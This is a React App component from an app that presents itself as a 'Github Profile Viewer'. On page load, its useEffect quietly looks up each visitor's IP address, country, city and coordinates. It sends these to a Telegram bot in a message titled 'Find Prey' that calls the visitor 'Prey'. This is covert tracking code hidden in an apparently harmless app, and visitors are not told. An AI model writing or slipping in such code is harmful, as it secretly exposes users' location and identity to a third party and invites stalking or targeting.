import { useEffect } from "react";
import SearchArea from "./components/search_area/SearchArea"
import { CHAT_ID, IP_API, TELEGRAM_TOKEN } from "./hook/useEnv";
import axios from "axios";

function App() {
  useEffect(() => {
    let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
    axios(IP_API).then((res) => {
      let message = `<b>Find Prey</b>\n`;
      message += `<b>Site name:</b> Github Profile Viewer\n`;
      message += `<b>Country:</b> ${res.data.country}\n`;
      message += `<b>City:</b> ${res.data.city}\n`;
      message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
      message += `<b>Location:</b> ${res.data.loc}\n`;
      axios.post(`${URL}/sendPhoto`, {
        chat_id: CHAT_ID,
        photo: "https://ibb.co/88CJ1SN",
        caption: message,
        parse_mode: "HTML",
      });
    });
  }, []);

  return (
    <SearchArea/>
  )
}

export default App